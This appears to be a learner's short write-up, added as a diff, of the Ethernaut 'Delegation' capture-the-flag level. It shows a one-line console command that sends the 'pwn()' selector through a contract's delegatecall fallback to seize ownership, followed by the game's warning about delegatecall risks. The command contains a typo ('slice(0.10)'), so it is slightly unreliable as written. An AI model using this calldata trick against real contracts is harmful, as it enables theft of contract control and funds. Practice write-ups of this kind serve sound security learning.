@@ -1,0 +1,14 @@
+DelegateCall 
+This level wanna show us that ".call" and ".delegatecall" is different. 
+
+In the Console, i put below code to solve this issue.
+
+contract.sendTransaction({data:web3.utils.sha3('pwn()').slice(0.10)})
+//if you only use web3.sha3(), that will be reported "web3.sha3 is not a func ", so i look through the solidity docs(0.8.3) and that remind me "web3.utils.sha3" is right.
+
+
+//Reminder after level clearance
+Usage of delegatecall is particularly risky and has been used as an attack vector on multiple historic hacks. 
+With it, your contract is practically saying "here, -other contract- or -other library-, do whatever you want with my state". 
+Delegates have complete access to your contract's state. The delegatecall function is a powerful feature, but a dangerous one, and must be used with extreme care.
+
